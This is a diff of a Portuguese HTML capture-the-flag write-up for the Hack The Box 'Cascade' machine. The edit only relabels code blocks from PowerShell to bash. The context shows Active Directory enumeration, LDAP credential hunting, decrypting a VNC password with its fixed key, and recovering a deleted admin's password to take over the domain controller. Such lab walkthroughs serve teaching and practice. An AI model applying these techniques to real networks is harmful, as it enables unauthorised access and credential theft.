@@ -193,7 +193,7 @@
 <h1 id="enumeração"><a class="header" href="#enumeração">Enumeração</a></h1>
 <h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
 <p>Como em todas as máquinas que fazemos, e como em qualquer trabalho de Pentesting, a primeira fase é a de reconhecimento. Nesta fase, iremos proceder á enumeração das portas, e de outras coisas a seguir. Para enumerar as portas da nossa máquina alvo, irei usar o <strong>nmap</strong>.</p>
-<pre><code class="language-powershell">nmap -p- -n -Pn 10.10.10.182 -sS --min-rate 5000 -oG enumeration/allPorts
+<pre><code class="language-bash">nmap -p- -n -Pn 10.10.10.182 -sS --min-rate 5000 -oG enumeration/allPorts
 nmap -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170 10.10.10.182 -sC -sV -Pn -oN enumeration/nmap-a.txt
 </code></pre>
 <p><img src="Assets/HTB-Windows-Medium-Cascade/enum-nmap.png" alt="Enumeração das Portas" /></p>
@@ -237,15 +237,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>O resultado do nmap nos indica que provavelmente estaremos enfrentando um Active Directory / Domain Controller, devido ás suas portas de DNS, Samba, RPC, LDAP, Kerberos e WinRM abertas.</p>
 <h2 id="rdp"><a class="header" href="#rdp">RDP</a></h2>
 <p>A primeira coisa a analisar é ver se podemos extrair nomes de usuários de domínio via RPCClient. Nesta máquina temos que especificar que queremos entrar com o usuário vazio (-U '') e sem password (-N).</p>
-<pre><code class="language-powershell">rpcclient 10.10.10.182 -N -U ''
+<pre><code class="language-bash">rpcclient 10.10.10.182 -N -U ''
 </code></pre>
 <p>Neste ponto estamos efectivamente no modo interativo, e podemos listar os usuários via <strong><em>enumdomusers</em></strong>. Para extrair melhor os dados, prefiro executar diretamente os comandos em vez de entrar em modo interativo para poder receber o resultado no meu stdout normal e poder pipear os comandos com outros:</p>
-<pre><code class="language-powershell">rpcclient 10.10.10.182 -N -U '' -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' &gt; contents/users
+<pre><code class="language-bash">rpcclient 10.10.10.182 -N -U '' -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' &gt; contents/users
 </code></pre>
 <p><img src="Assets/HTB-Windows-Medium-Cascade/enum-get-users.png" alt="Enumeração de usuários via RPC" /></p>
 <h2 id="getnpuserspy"><a class="header" href="#getnpuserspy">GetNPUsers.py</a></h2>
 <p>Agora que temos usuários de domínio, irei só adicionar usuários admin por defeito e, já que kerberos está aberto, tentar efetuar uma ataque chamado AS-REP Roasting Attack, para tentar recuperar TGT de usuário que foram criados com a opção 'Do not require Kerberos preauthentication' selecionada. Ainda perciso saber o nome do Domain Controller. Então primeiro, vou rodar um crackmapexec, guardar as informações relevantes, e a seguir usar o GetNPUsers.py para tentar recuperar TGTs.</p>
-<pre><code class="language-powershell">crackmapexec smb 10.10.10.182
+<pre><code class="language-bash">crackmapexec smb 10.10.10.182
 #&gt;  SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
 echo -e &quot;10.10.10.182\tcascade.local&quot; &gt;&gt; /etc/hosts
 
@@ -254,7 +254,7 @@ GetNPUsers.py cascade.local/ -no-pass -usersfile contents/users
 <p>Nenhum usuário é AS-REP Roastable... Next!</p>
 <h2 id="ldapsearch"><a class="header" href="#ldapsearch">LDAPSearch</a></h2>
 <p>O ldapsearch é uma ferramenta que pode extrair toda a informação de todos os objectos extraíveis por LDAP, que é um protocolo de aplicação para acessar e manter serviços de informações de diretório. É por aí que, por exemplo, uma administrador de domínio cria um novo usuário local de uma máquina onde ele não está... Podemos enumerar os usuários todos, grupos, quem pertence a &quot;x&quot; grupo... É também esse o protocolo pelo qual a ferramenta <strong><em>bloodhound-python</em></strong>, já usada em outras máquina, extrai toda a informação para gerar o gráfico do bloodhound.</p>
-<pre><code class="language-powershell">ldapsearch -x -h 10.10.10.182 -b &quot;dc=cascade,dc=local&quot; | grep &quot;@cascade.local&quot; -A 25 | grep -Ei &quot;userPrincipalName|pass|pwd|cred|secret&quot;
+<pre><code class="language-bash">ldapsearch -x -h 10.10.10.182 -b &quot;dc=cascade,dc=local&quot; | grep &quot;@cascade.local&quot; -A 25 | grep -Ei &quot;userPrincipalName|pass|pwd|cred|secret&quot;
 
 #&gt;  userPrincipalName: CascGuest@cascade.local
 #&gt;  userPrincipalName: arksvc@cascade.local
@@ -286,7 +286,7 @@ GetNPUsers.py cascade.local/ -no-pass -usersfile contents/users
 <h1 id="privesc"><a class="header" href="#privesc">PrivEsc</a></h1>
 <h2 id="smbclient"><a class="header" href="#smbclient">SMBClient</a></h2>
 <p>Temos credenciais válidas. Agora com essas novas credenciais podemos aceder ao conteúdo partilhado por Samba</p>
-<pre><code class="language-powershell">smbmap -H 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
+<pre><code class="language-bash">smbmap -H 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
 
 #&gt;  [+] IP: 10.10.10.182:445        Name: cascade.local
 #&gt;          Disk                                                    Permissions     Comment
@@ -301,7 +301,7 @@ GetNPUsers.py cascade.local/ -no-pass -usersfile contents/users
 #&gt;          SYSVOL                                                  READ ONLY       Logon server share
 </code></pre>
 <p>Podemos ver 4 recursos compartilhados. Vamos dar uma vista de olhos á pasta Data</p>
-<pre><code class="language-powershell">smbclient \\\\10.10.10.182\\Data -U 'r.thompson%rY4n5eva'
+<pre><code class="language-bash">smbclient \\\\10.10.10.182\\Data -U 'r.thompson%rY4n5eva'
 
 #&gt;  Try &quot;help&quot; to get a list of possible commands.
 #&gt;  smb: \&gt; dir
@@ -317,7 +317,7 @@ GetNPUsers.py cascade.local/ -no-pass -usersfile contents/users
 #&gt;  smb: \&gt;
 </code></pre>
 <p>smbclient permite ver os recursos em modo interativo. Vemos que são várias pastas. Como não há muitas coisas, e o conteúdo também não é grande, vou descarregar tudo de uma vez só</p>
-<pre><code class="language-powershell">smb: \&gt; prompt off
+<pre><code class="language-bash">smb: \&gt; prompt off
 smb: \&gt; recurse on
 mget *
 </code></pre>
@@ -354,14 +354,14 @@ Steve
 <blockquote>
 <p>&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f</p>
 </blockquote>
-<pre><code class="language-powershell">dos2unix VNC\ Install.reg
+<pre><code class="language-bash">dos2unix VNC\ Install.reg
 cat VNC\ Install.reg | grep 'Password' | tr -d ',' | awk -F &quot;:&quot; '{print$2}'
 #&gt;  6bcf2a4b6e5aca0f
 echo $(cat VNC\ Install.reg | grep 'Password' | tr -d ',' | awk -F &quot;:&quot; '{print$2}') | xxd -ps -r
 #&gt; k*KnZ
 </code></pre>
 <p>Não parece ser a password... e se tentarmos validar com crackmapexec, não corresponde a nenhum usuário. VNC encripta a palavra passe. Mas com uma pequena pesquisa, da para se encontrar na net com desencriptar...</p>
-<pre><code class="language-powershell">echo $(cat VNC\ Install.reg | grep 'Password' | tr -d ',' | awk -F &quot;:&quot; '{print$2}') | xxd -ps -r | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
+<pre><code class="language-bash">echo $(cat VNC\ Install.reg | grep 'Password' | tr -d ',' | awk -F &quot;:&quot; '{print$2}') | xxd -ps -r | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
 #&gt;  sT333ve2
 </code></pre>
 <p>Agora sim! parece uma password</p>
@@ -373,7 +373,7 @@ echo $(cat VNC\ Install.reg | grep 'Password' | tr -d ',' | awk -F &quot;:&quot;
 <p>s.smith tem acesso a mais uma pasta. a pasta Audit$. Vamos ver o que há lá e descarregar tudo se for viável devido ao peso.</p>
 <h2 id="sqlite3"><a class="header" href="#sqlite3">sqlite3</a></h2>
 <p>No recurso Audit$ compartilhado a nível de rede, existem binários.exe, dlls e uma base de dados. Podemos ver rapidamente a base de dados com sqlite3</p>
-<pre><code class="language-powershell">sqlite3 Audit.db
+<pre><code class="language-bash">sqlite3 Audit.db
 sqlite&gt; .tables
 #&gt;  DeletedUserAudit  Ldap              Misc
 sqlite&gt; select * from DeletedUserAudit;
@@ -387,13 +387,13 @@ sqlite&gt; select * from Ldap;
 #&gt;  1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
 </code></pre>
 <p>ArkSvc está na nossa lista de usuários. O dado encriptado em base64 poderá ser a palavra pass...</p>
-<pre><code class="language-powershell">echo BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d
+<pre><code class="language-bash">echo BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d
 #&gt; D|zC;
 </code></pre>
 <p>Parece que não está em texto claro!! Mas também não sabemos como foi criptografado... não é como o VNC, que sempre criptografa as suas palavras passes da mesma maneira à anos... Temos que encontrar como foi criptografado. Isto vem de uma base de dados, que está na mesma pasta que um programa desconhecido e o seu dll (aparentemente): CascAudit.exe e CascCrypto.dll. Pelos nomes, isto é promissor...</p>
 <h2 id="dotpeek-jetbrains"><a class="header" href="#dotpeek-jetbrains">dotPeek (JetBrains)</a></h2>
 <p>O dotPeek é um descompilador de código baseado em .NET. E como sei que esse programa funciona?</p>
-<pre><code class="language-powershell">file CascAudit.exe
+<pre><code class="language-bash">file CascAudit.exe
 #&gt;  CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
 </code></pre>
 <p>Com a utilidade &quot;<strong><em>file</em></strong>&quot;, vemos que é um executável Windows feito em Mono/.Net assembly. Portanto, é provável que funcione</p>
@@ -425,7 +425,7 @@ sqlite&gt; select * from Ldap;
 <p>arksvc:w3lc0meFr31nd</p>
 </blockquote>
 <p>Sempre verificar a palavra passe com crackmapexec</p>
-<pre><code class="language-powershell">crackmapexec smb 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
+<pre><code class="language-bash">crackmapexec smb 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
 
 #&gt;  SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
 #&gt;  SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd
@@ -441,14 +441,14 @@ crackmapexec winrm 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
 <p><img src="Assets/HTB-Windows-Medium-Cascade/evil-winrm-arksvc.png" alt="Evil-winrm de arksvc" /></p>
 <p>A ultima fase para escalar privilégios até administrador é a seguinte: Este usuário está no grupo &quot;<em>CASCADE\AD Recycle Bin</em>&quot;. Isto permite ver todos os objectos do active directory que foram removidos. Isto inclui o tal usuário TempAdmin, cuja a sua password poderá ser a mesma do que a do Administrator.</p>
 <p>Para reaver todos os objectos removidos, basta uma linha de comando...</p>
-<pre><code class="language-powershell">Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+<pre><code class="language-bash">Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 </code></pre>
 <p>Á resposta deste comando nesta máquina não é muito grande... mas normalmente é enorme. Por isso, recomendo exportar para um ficheiro, fazer o download deste para a nossa maquina, e fazer um grep por &quot;<strong>LegacyPwd e CanonicalName</strong>&quot; ´</p>
-<pre><code class="language-powershell">Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * &gt; output.txt
+<pre><code class="language-bash">Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * &gt; output.txt
 # Pelo evil-winrm, é possível fazer donwload e upload directamente com a ferramenta:
 download &quot;C:/Users/arksvc/Documents/output.txt&quot;
 </code></pre>
-<pre><code class="language-powershell"># kali
+<pre><code class="language-bash"># kali
 cat output.txt | grep -Ei &quot;Legacypwd|canonicalName&quot;
 
 #&gt;  CanonicalName                   : cascade.local/Deleted Objects
@@ -461,13 +461,13 @@ cat output.txt | grep -Ei &quot;Legacypwd|canonicalName&quot;
 #&gt;  cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
 </code></pre>
 <p>O último objecto cascade.local/Deleted Objects/TempAdmin tem como password logo abaixo YmFDVDNyMWFOMDBkbGVz (que me parece ser base64 também, mesmo não existing um &quot;=&quot; ou dois &quot;==&quot; no final)</p>
-<pre><code class="language-powershell">echo YmFDVDNyMWFOMDBkbGVz | base64 -d
+<pre><code class="language-bash">echo YmFDVDNyMWFOMDBkbGVz | base64 -d
 #&gt;  baCT3r1aN00dles
 </code></pre>
 <p>Esta password era do usuário TempAdmin, mas o ficheiro html nos indicava que este usuário tinha a mesma password do que o administrador. Vamos fazer um spray na mesma com crackmapexec, mas à partida não há dúvidas</p>
 <p><img src="Assets/HTB-Windows-Medium-Cascade/crackmapexec-admin.png" alt="crackmapexec Administrator" /></p>
 <p>Está feito! Somos donos da máquina...</p>
-<pre><code class="language-powershell">cmd /c 'dir /r /s root.txt user.txt 2&gt;NUL'
+<pre><code class="language-bash">cmd /c 'dir /r /s root.txt user.txt 2&gt;NUL'
 
 (type C:\Users\Administrator\Desktop\root.txt).SubString(0,15)
 #&gt;  84c82c72c538ca8
